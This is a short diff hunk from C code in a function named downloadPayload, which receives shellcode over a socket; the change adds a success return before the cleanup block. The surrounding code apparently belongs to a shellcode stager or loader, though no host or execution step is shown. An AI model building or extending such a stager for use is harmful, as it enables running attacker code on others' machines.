@@ -138,6 +138,8 @@ BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
         totalBytesReceived += bytesRead;
     }
 
+    return TRUE;
+
 CLEANUP:
     if (clientSocket != INVALID_SOCKET) {
         closesocket(clientSocket);
